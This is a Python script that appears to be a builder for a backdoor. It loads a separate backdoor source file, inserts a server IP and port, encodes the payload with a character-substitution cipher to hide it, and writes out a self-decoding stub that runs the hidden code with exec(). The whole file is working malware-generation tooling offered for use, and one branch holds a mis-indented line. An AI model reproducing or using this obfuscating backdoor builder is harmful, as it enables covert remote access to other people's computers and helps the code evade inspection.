encrypted = list("""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
decrypted = list("""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")

def file_encrypt(string):
    final = ""
    for i in list(string):
        if i == "\n":
            final += "\n"
        else:
            n = decrypted.index(i)
            final += encrypted[n]
    return final

def decrypt(string):
    final = ""
    for i in list(string):
        if i == "\n":
            final += "\n"
        else:
            n = encrypted.index(i)
            final += decrypted[n]
    return final

to_compile = False
final_name = "test"
server = "192.168.1.103"
port = "23125"
#print("Communications encryption? (Yes/No): ")
#encryption = str(input("> "))
#encryption = True if encryption.lower() == "yes" else False if encryption.lower() == "no" else create_backdoor()
encryption = False
initial = '''encrypted = list("""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
decrypted = list("""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
def decrypt(string):
    final = ""
    for i in list(string):
        if i == "\\n":
            final += "\\n"
        else:
            n = encrypted.index(i)
            final += decrypted[n]
    return final
exec({0} + decrypt({c133679455d4c91047b3b50234aa7ab}))'''.replace("{0}", '''\'\'\'global encrypted
global decrypted
encrypted = list(r"""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
decrypted = list(r"""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
{encryption}\n\'\'\'''')

if encryption:
    initial = initial.replace("{encryption}", """
def encrypt(string):
    final = ""
    for i in list(string):
        if i == "\\\\n":
            final += "\\\\n"
        else:
            n = decrypted.index(i)
    final += encrypted[n]
    return final
def decrypt(string):
    final = ""
    for i in list(string):
        if i == "\\\\n":
            final += "\\\\n"
        else:
            n = encrypted.index(i)
            final += decrypted[n]
    return final\\n\'\'\'
    """)
elif not encryption:###########################################################
    initial = initial.replace("{encryption}","""
def encrypt(string):
    return string
def decrypt(string):
    return string
        """)

with open("backdoor_decrypted.py", encoding="utf-8") as file:
    decrypted_backdoor = file.read()
encrypted_backdoor = file_encrypt(decrypted_backdoor.replace("{cb5185196ad3147d58c13c22b2a32292}", str(to_compile)).replace(
    "{8f8c6b7b02405c7ab1027019e69a81e1}", final_name + ".exe" if to_compile else ".py").replace(
    "{cf1e8c14e54505f60aa10ceb8d5d8ab3}", server).replace("{901555fb06e346cb065ceb9808dcfc25}", port))
final_backdoor = initial.replace("{c133679455d4c91047b3b50234aa7ab}", "'''" + encrypted_backdoor + "'''")
with open(final_name + ".py", "w", encoding="utf-8") as file:
    file.write(final_backdoor.replace("\\a", "\\\\a"))
